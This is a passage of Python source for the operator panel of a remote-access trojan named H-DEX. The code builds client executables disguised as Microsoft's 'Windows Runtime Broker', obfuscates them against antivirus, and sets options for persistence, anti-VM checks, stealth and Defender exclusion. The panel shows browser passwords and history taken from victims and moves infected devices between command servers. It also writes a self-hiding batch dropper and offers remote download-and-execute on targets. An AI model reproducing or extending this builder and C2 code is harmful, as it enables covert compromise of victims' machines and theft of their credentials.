        self.bulk_executors["bulk"] = BulkExecutorWindow(self.root, list(self.selected_devices), self, self.colors)

    def run_security_scan(self):
        """Simulate a premium security scan report"""
        def scan():
            win = ctk.CTkToplevel(self.root)
            win.title("H-DEX ADVANCED SECURITY AUDIT")
            win.geometry("600x500")
            win.attributes("-topmost", True)
            
            txt = ctk.CTkTextbox(win, font=("Consolas", 11), fg_color="#050505", text_color="#00ff41")
            txt.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            
            steps = [
                "[*] Initializing Security Audit Engine v4.0...",
                "[*] Scanning connected nodes for vulnerabilities...",
                "[*] Checking encryption protocols (WSS/TLS 1.3)...",
                "[*] Verifying Dashboard Token integrity...",
                "[*] Analyzing client-side stealth mechanisms...",
                "[*] Testing Firewall evasion signatures...",
                "[*] Audit Complete. Generating report..."
            ]
            
            for step in steps:
                txt.insert(tk.END, step + "\n")
                txt.see(tk.END)
                time.sleep(0.4)
            
            report = f"""
==================================================
        H-DEX SECURITY AUDIT REPORT
==================================================
STATUS: SECURE (85%)
DATE: {time.strftime('%Y-%m-%d %H:%M:%S')}

[VULNERABILITIES FOUND]
- 127.0.0.1 (Localnode) has non-SSL backup enabled.
- 3 Clients are running without ANTI-VM.

[RECOMMENDATIONS]
1. Enable 'FORCE_SSL' in server config.
2. Rebuild clients with 'ANTI_VM' enabled.
3. Rotate Dashboard Token every 30 days.

[INFRASTRUCTURE]
Server: {self.server_uri}
Total Nodes: {len(self.devices)}
==================================================
"""
            txt.insert(tk.END, report)
            
        threading.Thread(target=scan, daemon=True).start()

    def show_text_viewer(self, title, content):
        """Show long text content in a popup window"""
        win = ctk.CTkToplevel(self.root)
        win.title(title)
        win.geometry("600x400")
        win.configure(bg=self.colors["bg"])
        
        textbox = ctk.CTkTextbox(win, font=("Consolas", 12), fg_color=self.colors["bg"], text_color=self.colors["text"])
        textbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        textbox.insert(tk.END, content)
        textbox.configure(state="disabled")

    def save_download(self, data):
        filename = data.get("filename")
        content = base64.b64decode(data.get("content"))
        path = filedialog.asksaveasfilename(initialfile=filename)
        if path:
            with open(path, "wb") as f: f.write(content)
            messagebox.showinfo("Success", "File downloaded.")

    def show_browser_history(self, data):
        """Show browser history in a popup window"""
        win = ctk.CTkToplevel(self.root)
        win.title("Browser History")
        win.geometry("800x500")
        win.configure(bg=self.colors["bg"])
        
        ctk.CTkLabel(win, text=f"Browser History ({data.get('total', 0)} entries)", 
                     font=("Segoe UI", 18, "bold"), text_color=self.colors["accent"]).pack(pady=10)
        
        scroll = ctk.CTkScrollableFrame(win, fg_color=self.colors["surface"])
        scroll.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        for entry in data.get("history", []):
            f = ctk.CTkFrame(scroll, fg_color=self.colors["bg"])
            f.pack(fill=tk.X, pady=2, padx=5)
            ctk.CTkLabel(f, text=f"[{entry.get('browser')}]", width=80, text_color=self.colors["accent"]).pack(side=tk.LEFT, padx=5)
            ctk.CTkLabel(f, text=(entry.get("title") or "")[:50], width=200, anchor="w").pack(side=tk.LEFT, padx=5)
            ctk.CTkLabel(f, text=entry.get("url", "")[:60], anchor="w", text_color=self.colors["text_dim"]).pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)

    def show_browser_passwords(self, data):
        """Show browser passwords in a popup window"""
        win = ctk.CTkToplevel(self.root)
        win.title("Browser Passwords")
        win.geometry("700x400")
        win.configure(bg=self.colors["bg"])
        
        ctk.CTkLabel(win, text=f"Saved Passwords ({data.get('total', 0)} entries)", 
                     font=("Segoe UI", 18, "bold"), text_color=self.colors["accent"]).pack(pady=10)
        
        scroll = ctk.CTkScrollableFrame(win, fg_color=self.colors["surface"])
        scroll.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        for entry in data.get("passwords", []):
            f = ctk.CTkFrame(scroll, fg_color=self.colors["bg"])
            f.pack(fill=tk.X, pady=2, padx=5)
            ctk.CTkLabel(f, text=entry.get("url", "")[:40], width=200, anchor="w").pack(side=tk.LEFT, padx=5)
            ctk.CTkLabel(f, text=entry.get("username", ""), width=150, anchor="w", text_color=self.colors["accent"]).pack(side=tk.LEFT, padx=5)
            ctk.CTkLabel(f, text=entry.get("password", ""), anchor="w", text_color=self.colors["text_dim"]).pack(side=tk.LEFT, padx=5)

    # --- Builder ---
    def build_client(self):
        """Build executable client using PyInstaller with stealth enhancements"""
        uri = self.build_uri.get()
        if not uri:
            messagebox.showerror("Error", "Server URI is required.")
            return

        if not (uri.startswith("ws://") or uri.startswith("wss://")):
            messagebox.showerror("Error", "Invalid URI, must start with ws:// or wss://")
            return
        
        # Ensure /ws suffix if missing
        if not uri.endswith("/ws") and any(d in uri for d in ["hf.space", "railway.app", "render.com"]):
            uri = uri.strip("/") + "/ws"
            
        self.build_log.delete("1.0", tk.END)
        self.build_log.insert(tk.END, "Starting build process...\n")
        
        # Read template
        if not os.path.exists("client_template.py"):
            messagebox.showerror("Error", "client_template.py not found!")
            return

        tag = self.build_tag.get() or "Client"
        icon = self.build_icon.get()
        
        persist = "True" if self.build_persistence.get() else "False"
        anti_vm = "True" if self.build_anti_vm.get() else "False"
        stealth = "True" if self.build_stealth.get() else "False"
        geofence = "True" if self.build_geofence.get() else "False"
        melt = "True" if self.build_melter.get() else "False"
        crit = "True" if self.build_critical.get() else "False"
        ext = "True" if self.build_defender.get() else "False"
        delay = self.build_delay.get() or "0"
        out_name = self.build_name.get() or "client_built"
        startup_name = self.build_startup_name.get() or "H-Dex Client"

        # Disguise metadata
        disguise_company = getattr(self, 'build_disguise_company', None)
        disguise_product = getattr(self, 'build_disguise_product', None)
        disguise_desc = getattr(self, 'build_disguise_desc', None)
        
        company = disguise_company.get() if disguise_company else "Microsoft Corporation"
        product = disguise_product.get() if disguise_product else "Windows Runtime Broker"
        description = disguise_desc.get() if disguise_desc else "Microsoft Windows Runtime Object Broker"

        def generate_version_info(build_dir, company_name, product_name, file_description, exe_name):
            """Generate a PyInstaller-compatible Windows Version Info file"""
            version_content = f"""# UTF-8
#
# For more details about fixed file info 'ffi' see:
# http://msdn.microsoft.com/en-us/library/ms646997.aspx
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(10, 0, 22621, 1),
    prodvers=(10, 0, 22621, 1),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'{company_name}'),
        StringStruct(u'FileDescription', u'{file_description}'),
        StringStruct(u'FileVersion', u'10.0.22621.1 (WinBuild.160101.0800)'),
        StringStruct(u'InternalName', u'{exe_name}'),
        StringStruct(u'LegalCopyright', u'\\xa9 {company_name}. All rights reserved.'),
        StringStruct(u'OriginalFilename', u'{exe_name}.exe'),
        StringStruct(u'ProductName', u'{product_name}'),
        StringStruct(u'ProductVersion', u'10.0.22621.1')])
      ]),
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)"""
            path = os.path.join(build_dir, "version_info.txt")
            with open(path, "w", encoding="utf-8") as f:
                f.write(version_content)
            return path

        def generate_manifest(build_dir, exe_name):
            """Generate a UAC manifest requesting asInvoker (no elevation prompt)"""
            manifest_content = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity
    version="10.0.22621.1"
    processorArchitecture="amd64"
    name="{exe_name}"
    type="win32"
  />
  <description>{exe_name}</description>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <supportedOS Id="{{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}}"/>
      <supportedOS Id="{{1f676c76-80e1-4239-95bb-83d0f6d0da78}}"/>
      <supportedOS Id="{{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}}"/>
      <supportedOS Id="{{35138b9a-5d96-4fbd-8e2d-a2440225f93a}}"/>
      <supportedOS Id="{{e2011457-1546-43c5-a5fe-008deee3d3f0}}"/>
    </application>
  </compatibility>
</assembly>"""
            path = os.path.join(build_dir, f"{exe_name}.manifest")
            with open(path, "w", encoding="utf-8") as f:
                f.write(manifest_content)
            return path

        def run_build():
            try:
                self.root.after(0, lambda: self.build_log.insert(tk.END, "="*60 + "\n"))
                self.root.after(0, lambda: self.build_log.insert(tk.END, "  H-DEX CLIENT BUILDER v4.0 (STEALTH)\n"))
                self.root.after(0, lambda: self.build_log.insert(tk.END, "="*60 + "\n\n"))
                self.root.after(0, lambda: self.build_log.insert(tk.END, f"[*] Target: {tag}\n"))
                self.root.after(0, lambda: self.build_log.insert(tk.END, f"[*] Server: {uri}\n"))
                self.root.after(0, lambda: self.build_log.insert(tk.END, f"[*] Output: {out_name}.exe\n"))
                self.root.after(0, lambda: self.build_log.insert(tk.END, f"[*] Disguise: {product} by {company}\n\n"))
                
                self.root.after(0, lambda: self.build_log.insert(tk.END, "[1/7] Loading template...\n"))
                with open("client_template.py", "r", encoding="utf-8") as f:
                    code = f.read()
                self.root.after(0, lambda: self.build_log.insert(tk.END, f"      ✓ Loaded {len(code)} bytes\n"))
                
                self.root.after(0, lambda: self.build_log.insert(tk.END, "[2/7] Injecting configuration...\n"))
                code = code.replace('SERVER_URI = "##_SERVER_URI_##"', f'SERVER_URI = "{uri}"')
                code = code.replace('CLIENT_TAG = "##_CLIENT_TAG_##"', f'CLIENT_TAG = "{tag}"')
                code = code.replace('ADD_TO_STARTUP = "##_ADD_TO_STARTUP_##"', f'ADD_TO_STARTUP = "{persist}"')
                code = code.replace('STARTUP_KEY_NAME = "##_STARTUP_KEY_NAME_##"', f'STARTUP_KEY_NAME = "{startup_name}"')
                code = code.replace('##_SLEEP_DELAY_##', delay)
                
                # Advanced Replacements
                code = code.replace('ENABLE_ANTI_VM = False', f'ENABLE_ANTI_VM = {anti_vm}')
                code = code.replace('STEALTH_MODE = False', f'STEALTH_MODE = {stealth}')
                code = code.replace('ENABLE_GEOFENCE = False', f'ENABLE_GEOFENCE = {geofence}')
                code = code.replace('ENABLE_MELTER = False', f'ENABLE_MELTER = {melt}')
                code = code.replace('ENABLE_CRITICAL = False', f'ENABLE_CRITICAL = {crit}')
                code = code.replace('ENABLE_DEFENDER_EXCLUSION = False', f'ENABLE_DEFENDER_EXCLUSION = {ext}')
                
                self.root.after(0, lambda: self.build_log.insert(tk.END, "      ✓ Configuration injected\n"))
                
                if not os.path.exists("build"):
                    os.makedirs("build")

                self.root.after(0, lambda: self.build_log.insert(tk.END, "[3/7] Writing build file...\n"))
                with open(f"build/{out_name}.py", "w", encoding="utf-8") as f: f.write(code)
                self.root.after(0, lambda: self.build_log.insert(tk.END, f"      ✓ Saved to build/{out_name}.py\n"))
                
                self.root.after(0, lambda: self.build_log.insert(tk.END, "[4/7] Generating Version Info resource...\n"))
                version_path = generate_version_info("build", company, product, description, out_name)
                self.root.after(0, lambda: self.build_log.insert(tk.END, f"      ✓ Version Info: {version_path}\n"))
                
                self.root.after(0, lambda: self.build_log.insert(tk.END, "[5/7] Generating UAC Manifest (asInvoker)...\n"))
                manifest_path = generate_manifest("build", out_name)
                self.root.after(0, lambda: self.build_log.insert(tk.END, f"      ✓ Manifest: {manifest_path}\n"))
                
                self.root.after(0, lambda: self.build_log.insert(tk.END, "[5.5/7] Obfuscating payload against AV (PyArmor)...\n"))
                target_py = f"build/{out_name}.py"
                try:
                    # Run PyArmor to obfuscate the script before compiling
                    import platform
                    pyarmor_cmd = "pyarmor.exe" if platform.system() == "Windows" else "pyarmor"
                    obf_cmd = [pyarmor_cmd, "gen", "-O", f"build/obf_{out_name}", target_py]
                    
                    # We run this and wait
                    obf_result = subprocess.run(obf_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                    if obf_result.returncode == 0:
                        target_py = f"build/obf_{out_name}/{out_name}.py"
                        self.root.after(0, lambda: self.build_log.insert(tk.END, "      ✓ Payload obfuscated successfully\n"))
                    else:
                        self.root.after(0, lambda: self.build_log.insert(tk.END, f"      [!] PyArmor failed, using raw payload. Error:\n{obf_result.stdout}\n"))
                except Exception as obf_e:
                    self.root.after(0, lambda: self.build_log.insert(tk.END, f"      [!] PyArmor skipped (not installed). Proceeding with raw compilation.\n"))
                
                self.root.after(0, lambda: self.build_log.insert(tk.END, "[6/7] Compiling executable (STEALTH MODE)...\n"))
                self.root.after(0, lambda: self.build_log.insert(tk.END, "      This may take 1-3 minutes...\n\n"))
                
                cmd = [
                    "pyinstaller", "--onefile", "--noconsole", "--clean",
                    "--version-file", version_path,
                    "--manifest", manifest_path,
                    "--paths", f"build/obf_{out_name}" if "obf" in target_py else "build", 
                    target_py
                ]
                if icon: cmd.extend(["--icon", icon])
                
                # Add hidden imports to reduce runtime errors
                hidden_imports = [
                    "websockets", "websockets.client", "websockets.exceptions",
                    "PIL", "PIL.Image", "mss", "pyautogui", "pyperclip",
                    "psutil", "requests", "pynput", "pynput.keyboard", "pynput.mouse",
                    "cv2", "numpy", "sounddevice"
                ]
                for hi in hidden_imports:
                    cmd.extend(["--hidden-import", hi])
                
                p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                for line in p.stdout:
                    self.root.after(0, lambda l=line: self.build_log.insert(tk.END, l))
                    self.root.after(0, lambda: self.build_log.see(tk.END))
                p.wait()
                
                self.root.after(0, lambda: self.build_log.insert(tk.END, "\n[7/7] Build complete!\n"))
                self.root.after(0, lambda: self.build_log.insert(tk.END, "="*60 + "\n"))
                if p.returncode == 0:
                    self.root.after(0, lambda: self.build_log.insert(tk.END, f"  ✓ SUCCESS: dist/{out_name}.exe\n"))
                    self.root.after(0, lambda: self.build_log.insert(tk.END, f"  ✓ DISGUISE: {product} ({company})\n"))
                    self.root.after(0, lambda: self.build_log.insert(tk.END, f"  ✓ MANIFEST: asInvoker (No UAC Prompt)\n"))
                    self.root.after(0, lambda: messagebox.showinfo("Done", f"Build Complete!\n\nExecutable: dist/{out_name}.exe\nDisguise: {product}"))
                else:
                    self.root.after(0, lambda: self.build_log.insert(tk.END, "  ✗ BUILD FAILED\n"))
                    self.root.after(0, lambda: messagebox.showerror("Error", "Build failed. Check the log for details."))
                self.root.after(0, lambda: self.build_log.insert(tk.END, "="*60 + "\n"))
                
            except Exception as e:
                self.root.after(0, lambda: self.build_log.insert(tk.END, f"\n[ERROR] {e}\n"))
                self.root.after(0, lambda: messagebox.showerror("Error", f"Build failed: {e}"))
            
        threading.Thread(target=run_build).start()


    def build_bat_client(self):
        filename = filedialog.asksaveasfilename(defaultextension=".bat", filetypes=[("Batch File", "*.bat")])
        if not filename: return
        
        content = """@echo off
:: Created by H-DEX Builder
:: Create hidden folders
mkdir .sys_config 2>nul
attrib +h .sys_config
mkdir .win_update 2>nul
attrib +h .win_update
mkdir .data_cache 2>nul
attrib +h .data_cache

:: Hide self
attrib +h "%~f0"

:: Launch Client if present
if exist client.exe start "" client.exe
"""
        try:
            with open(filename, "w") as f:
                f.write(content)
            messagebox.showinfo("Success", "Batch file created successfully.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create batch file: {e}")

    def build_remover(self):
        startup_name = self.build_startup_name.get()
        if not startup_name:
            return messagebox.showerror("Error", "Startup Key Name is required to build the uninstaller.")
            
        is_critical = "True" if self.build_critical.get() else "False"
        
        try:
            with open("remover_template.py", "r", encoding="utf-8") as f:
                code = f.read()
        except FileNotFoundError:
            return messagebox.showerror("Error", "remover_template.py not found in directory.")

        code = code.replace('"{STARTUP_KEY_NAME}"', f'"{startup_name}"')
        code = code.replace('{ENABLE_CRITICAL}', is_critical)

        filename = filedialog.asksaveasfilename(defaultextension=".py", initialfile=f"Uninstall_{startup_name.replace(' ', '_')}.py", filetypes=[("Python Script", "*.py")])
        if not filename: return
        
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(code)
            messagebox.showinfo("Success", f"Uninstaller successfully generated at:\n{filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save uninstaller: {e}")

    # --- Utils ---
    def check_password(self): return True # Simplified

    def load_config(self):
        if not os.path.exists(CONFIG_FILE):
            config = {"theme": "H-Dex Dark", "server_uri": DEFAULT_SERVER, "token": "hdex_admin_2026"}
        else:
            with open(CONFIG_FILE, "r") as f:
                try:
                    config = json.load(f)
                except json.JSONDecodeError:
                    config = {"theme": "H-Dex Dark", "server_uri": DEFAULT_SERVER, "token": "hdex_admin_2026"}
        
        # Ensure server_links exists
        if "server_links" not in config:
            config["server_links"] = [
                {"name": "Primary (Auto)", "url": config.get("server_uri", DEFAULT_SERVER), "status": "Unknown"},
                {"name": "Backup 1", "url": "wss://backup1.hdex.network", "status": "Unknown"},
                {"name": "Local Test", "url": "ws://localhost:8080", "status": "Unknown"}
            ]
        return config

    def load_server_links(self):
        return self.config.get("server_links", [])

    def save_server_links(self):
        self.config["server_links"] = self.server_links
        self.save_config()
        self.refresh_link_view()

    def add_server_link(self):
        name = simpledialog.askstring("Add Server", "Enter server name:")
        if not name: return
        url = simpledialog.askstring("Add Server", "Enter WebSocket URL (ws/wss):")
        if not url: return
        if not url.startswith(("ws://", "wss://")):
            return messagebox.showerror("Error", "Invalid URL format.")
        
        self.server_links.append({"name": name, "url": url, "status": "Unknown"})
        self.save_server_links()

    def remove_server_link(self, index):
        if len(self.server_links) <= 1:
            return messagebox.showwarning("Warning", "Cannot remove the last server link.")
        self.server_links.pop(index)
        self.save_server_links()

    async def check_link_health(self, index):
        url = self.server_links[index]["url"]
        try:
            # Briefly connect and register to get device list
            async with websockets.connect(url, open_timeout=5, close_timeout=3) as ws:
                self.server_links[index]["status"] = "Online"
                await ws.send(json.dumps({"type": "register_dashboard", "token": "hdex_admin_2026"}))
                
                # Wait for the device_list message
                data = await asyncio.wait_for(ws.recv(), timeout=2)
                resp = json.loads(data)
                if resp.get("type") == "device_list":
                    count = len(resp.get("devices", []))
                    self.server_links[index]["device_count"] = count
                else:
                    self.server_links[index]["device_count"] = 0
        except:
            self.server_links[index]["status"] = "Offline"
            self.server_links[index]["device_count"] = 0
        
        self.root.after(0, self.refresh_link_view)

    def test_all_links(self):
        for i in range(len(self.server_links)):
            asyncio.run_coroutine_threadsafe(self.check_link_health(i), self.loop)

    def migrate_all_to(self, url):
        if not self.selected_devices:
            if not messagebox.askyesno("Confirm", f"Migrate ALL connected devices to {url}?"):
                return
            targets = list(self.device_rows.keys())
        else:
            targets = list(self.selected_devices)

        if not targets:
            return messagebox.showinfo("Info", "No devices connected to migrate.")

        for dev_id in targets:
            self.send_json({"type": "migrate_server", "target_id": dev_id, "new_uri": url})
        
        messagebox.showinfo("Success", f"Migration command sent to {len(targets)} devices.")

    def add_one_link_to_clients(self, url):
        """Add a single backup URL to the clients' existing pool (without overwriting)"""
        if not self.selected_devices:
            if not messagebox.askyesno("Confirm", f"Add {url} as an EXTRA backup in ALL online clients?"):
                return
            targets = list(self.device_rows.keys())
        else:
            targets = list(self.selected_devices)

        if not targets:
            return messagebox.showinfo("Info", "No devices connected.")

        for dev_id in targets:
            self.send_json({"type": "add_to_pool", "target_id": dev_id, "new_uri": url})
        
        messagebox.showinfo("Success", f"Link added as backup to {len(targets)} devices pool.")

    def push_pool_to_clients(self):
        """Send the current server list to all selected or all online clients as fallback pool"""
        if not self.server_links: return
        
        pool = [l["url"] for l in self.server_links]
        
        if not self.selected_devices:
            if not messagebox.askyesno("Confirm", "Push this entire server list to ALL connected devices as their backup pool?"):
                return
            targets = list(self.device_rows.keys())
        else:
            targets = list(self.selected_devices)

        if not targets:
            return messagebox.showinfo("Info", "No devices connected to update.")

        for dev_id in targets:
            self.send_json({"type": "update_pool", "target_id": dev_id, "new_pool": pool})
        
        messagebox.showinfo("Success", f"Fallback pool ( {len(pool)} servers ) pushed to {len(targets)} devices.")

    def _create_link_changer_view(self):
        view = ctk.CTkFrame(self.content_area, fg_color="transparent")
        self.views["link changer"] = view
        
        # Header
        header = ctk.CTkFrame(view, fg_color="transparent")
        header.pack(fill=tk.X, pady=(0, 20))
        ctk.CTkLabel(header, text="🔗 Network Hub & Link Changer", font=("Segoe UI Light", 24), text_color=self.colors["accent"]).pack(side=tk.LEFT)
        
        ctk.CTkButton(header, text="📡 Push Fallback Pool", width=160, command=self.push_pool_to_clients,
                      fg_color=self.colors["accent"], text_color=self.colors["bg"], font=("Segoe UI", 12, "bold")).pack(side=tk.RIGHT, padx=5)
        ctk.CTkButton(header, text="+ Add New Link", width=120, command=self.add_server_link,
                      fg_color=self.colors["surface"]).pack(side=tk.RIGHT, padx=5)
        ctk.CTkButton(header, text="🔄 Refresh Status", width=120, command=self.test_all_links,
                      fg_color=self.colors["surface"]).pack(side=tk.RIGHT, padx=5)

        # Main Content
        self.link_container = ctk.CTkScrollableFrame(view, fg_color=self.colors["surface"], corner_radius=15, border_width=1, border_color=self.colors["border"])
        self.link_container.pack(fill=tk.BOTH, expand=True)
        
        self.refresh_link_view()

    def refresh_link_view(self):
        for w in self.link_container.winfo_children(): w.destroy()
        
        # Table Header
        h_frame = ctk.CTkFrame(self.link_container, fg_color="transparent")
        h_frame.pack(fill=tk.X, padx=10, pady=5)
        ctk.CTkLabel(h_frame, text="SERVER NAME", font=("Segoe UI", 10, "bold"), text_color=self.colors["text_dim"], width=150, anchor="w").pack(side=tk.LEFT, padx=10)
        ctk.CTkLabel(h_frame, text="WSS URL", font=("Segoe UI", 10, "bold"), text_color=self.colors["text_dim"], width=250, anchor="w").pack(side=tk.LEFT, padx=10)
        ctk.CTkLabel(h_frame, text="STATUS", font=("Segoe UI", 10, "bold"), text_color=self.colors["text_dim"], width=100).pack(side=tk.LEFT, padx=10)
        ctk.CTkLabel(h_frame, text="DEVICES", font=("Segoe UI", 10, "bold"), text_color=self.colors["text_dim"], width=80).pack(side=tk.LEFT, padx=10)
        ctk.CTkLabel(h_frame, text="ACTIONS", font=("Segoe UI", 10, "bold"), text_color=self.colors["text_dim"]).pack(side=tk.RIGHT, padx=40)

        for i, link in enumerate(self.server_links):
            row = ctk.CTkFrame(self.link_container, fg_color=self.colors["bg"] if i%2==0 else self.colors["surface_light"], corner_radius=8)
            row.pack(fill=tk.X, pady=2, padx=5)
            
            ctk.CTkLabel(row, text=link["name"], font=("Segoe UI Semibold", 13), width=150, anchor="w").pack(side=tk.LEFT, padx=20)
            ctk.CTkLabel(row, text=link["url"], font=("Consolas", 12), text_color=self.colors["text_dim"], width=250, anchor="w").pack(side=tk.LEFT, padx=10)
            
            # Status dot
            status = link.get("status", "Unknown")
            s_color = self.colors["success"] if status == "Online" else (self.colors["danger"] if status == "Offline" else "gray")
            ctk.CTkLabel(row, text=f"● {status}", text_color=s_color, font=("Segoe UI", 12, "bold"), width=100).pack(side=tk.LEFT, padx=10)
            
            # Device Count
            count = link.get("device_count", "?")
            c_color = self.colors["accent"] if count != "?" and count > 0 else self.colors["text_dim"]
            ctk.CTkLabel(row, text=str(count), font=("Segoe UI", 13, "bold"), text_color=c_color, width=80).pack(side=tk.LEFT, padx=10)
            
            # Buttons
            btn_f = ctk.CTkFrame(row, fg_color="transparent")
            btn_f.pack(side=tk.RIGHT, padx=10)
            
            # Use this link button
            ctk.CTkButton(btn_f, text="Admin Switch", width=120, height=28, font=("Segoe UI", 11),
                          command=lambda u=link["url"]: self.switch_to_server(u)).pack(side=tk.LEFT, padx=5)
            
            # Migrate clients button
            ctk.CTkButton(btn_f, text="📥 Migrate", width=100, height=28, font=("Segoe UI", 11, "bold"),
                           fg_color=self.colors["accent"], text_color=self.colors["bg"],
                           command=lambda u=link["url"]: self.migrate_all_to(u)).pack(side=tk.LEFT, padx=5)

            # Add as backup button
            ctk.CTkButton(btn_f, text="+ Backup", width=100, height=28, font=("Segoe UI", 11),
                           fg_color=self.colors["surface_light"], text_color=self.colors["text"],
                           command=lambda u=link["url"]: self.add_one_link_to_clients(u)).pack(side=tk.LEFT, padx=5)
            
            # Remove button
            ctk.CTkButton(btn_f, text="🗑", width=30, height=28, fg_color="transparent", text_color="red",
                          command=lambda idx=i: self.remove_server_link(idx)).pack(side=tk.LEFT, padx=5)

    def switch_to_server(self, url):
        if messagebox.askyesno("Switch Server", f"Dashboard will disconnect and connect to:\n{url}\n\nContinue?"):
            self.config["server_uri"] = url
            self.server_uri = url
            self.save_config()
            # The async loop will pick up the new server_uri on next reconnect
            if self.websocket:
                asyncio.run_coroutine_threadsafe(self.websocket.close(), self.loop)
            messagebox.showinfo("Switching", "Reconnecting to new server...")

    def save_config(self):
        with open(CONFIG_FILE, "w") as f:
            json.dump(self.config, f, indent=4)

    
    def filter_devices(self, event=None):
        query = self.device_search.get().lower()
        visible_count = 0
        
        for dev_id, card in self.device_rows.items():
            found = True
            
            # Check Group
            if self.current_group != "All Devices" and dev_id not in self.device_groups.get(self.current_group, []):
                found = False
            
            # Check Search Query
            if found and query:
                # Basic text check from card content
                card_text = ""
                try:
                    for child in card.winfo_children():
                        if isinstance(child, ctk.CTkLabel):
                            card_text += child.cget("text").lower() + " "
                        elif isinstance(child, ctk.CTkFrame): # Header/Actions
                             for sub in child.winfo_children():
                                if isinstance(sub, ctk.CTkLabel):
                                    card_text += sub.cget("text").lower() + " "
                except: pass
                
                if query not in card_text:
                    found = False
            
            if found:
                card.grid()
                visible_count += 1
            else:
                card.grid_remove()
                
        if visible_count == 0:
            self.empty_label.pack(pady=100)
            self.empty_label.configure(text="No matching devices found")
        else:
            self.empty_label.pack_forget()

    def export_data(self):
        if not self.device_rows:
            messagebox.showinfo("Export", "No devices to export.")
            return
            
        formats = [("CSV", "*.csv"), ("JSON", "*.json")]
        path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=formats, title="Export Device List")
        if not path: return
        
        import csv
        
        # Prepare data - extracting from UI is hacky but we don't have a clean central store sync'd perfectly yet
        # Better: iterate through self.clients if available? No, server has clients. Dashboard has copies.
        # update_device_list gets the list. We should store it.
        # But for now, we'll traverse the UI widgets or labels we set.
        
        data = []
        for dev_id, card in self.device_rows.items():
            # Extract info
            try:
                # Default values if extraction fails
                info = {"id": dev_id, "name": "Unknown", "ip": "Unknown", "os": "Unknown"}
                
                # We can try to extract from labels, or better, we should have stored the `dev` object in the card!
                # Let's see if we can attach it in create_device_card. Too late for that without re-run.
                # But wait, self.device_rows is {id: card}.
                # Let's just extract what we can.
                
                # Finding labels by text structure or grid position (risky).
                # Text labels: Name (bold), IP (dim), ID (dim)
                
                # Simplified: Just iterate children of card
                for child in card.winfo_children():
                    # Name is bold 16, IP is dim 11, ID is dim 9
                    if isinstance(child, ctk.CTkLabel):
                        font_size = 0
                        try:
                            f = child.cget("font")
                            if isinstance(f, tuple): font_size = f[1]
                            # ctk font might be object
                        except: pass
                        
                        txt = child.cget("text")
                        if "ID:" in txt: info["id"] = txt.replace("ID:", "").strip()
                        elif "●" not in txt and "🪟" not in txt and "💻" not in txt:
                            # Heuristic: Name usually has no extra punctuation, IP has dots
                            if "." in txt and any(c.isdigit() for c in txt): info["ip"] = txt
                            else: info["name"] = txt
                            
                data.append(info)
            except: pass
            
        if path.lower().endswith(".json"):
            with open(path, "w") as f:
                json.dump(data, f, indent=4)
        else:
            with open(path, "w", newline="") as f:
                writer = csv.DictWriter(f, fieldnames=["id", "name", "ip", "os"])
                writer.writeheader()
                for d in data:
                    writer.writerow(d)
                    
        messagebox.showinfo("Export", f"Exported {len(data)} devices to {path}")

    def change_server(self):
        s = simpledialog.askstring("Server", "URI:", initialvalue=self.server_uri)
        if s:
            # Automatically upgrade to wss for common cloud platforms
            if s.startswith("ws://") and any(d in s for d in ["railway.app", "up.railway.app", "herokuapp.com", "onrender.com", "hf.space"]):
                 s = s.replace("ws://", "wss://", 1)
            
            # Ensure /ws suffix if missing
            if any(d in s for d in ["hf.space", "railway.app", "render.com"]) and not s.endswith("/ws"):
                 s = s.rstrip("/") + "/ws"
                 
            self.server_uri = s
            self.config["server_uri"] = s
            self.save_config()

    def reset_password(self):
        if messagebox.askyesno("Reset Password", "Are you sure? You will be asked to set a new password on next restart."):
            if os.path.exists(CONFIG_FILE):
                self.config.pop("password_hash", None)
                self.save_config()
            messagebox.showinfo("Reset", "Password reset. Please restart the application.")

    def on_close(self):
        self.running = False
        self.root.destroy()

# --- Sub-Windows ---
# --- Sub-Windows ---
class ControlPanelWindow:
    def __init__(self, parent, dev_id, app, colors):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Control Panel - {dev_id}")
        self.window.geometry("1000x850")
        self.window.configure(bg=colors["bg"])
        self.app = app
        self.dev_id = dev_id
        self.colors = colors
        
        self.tabs = ctk.CTkTabview(self.window, fg_color=colors["surface"], segmented_button_selected_color=colors["accent"], segmented_button_selected_hover_color=colors["hover"])
        self.tabs.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        self.create_prank_tab()
        self.create_system_tab()
        self.create_spy_tab()
        self.create_deployment_tab()
        self.create_power_tab()
        self.create_admin_tab()
        self.create_notes_tab()

    def create_deployment_tab(self):
        tab = self.tabs.add("🚀 Deployment")
        scroll = ctk.CTkScrollableFrame(tab, fg_color="transparent")
        scroll.pack(fill=tk.BOTH, expand=True)

        # Remote Exec URL
        exec_card = self.create_card(scroll, "📥 Remote Execute from URL")
        ctk.CTkLabel(exec_card, text="Download and execute a file (.exe, .msi, .bat) directly on the target.", font=("Segoe UI", 11), text_color=self.colors["text_dim"]).pack(anchor="w", pady=(0, 10))
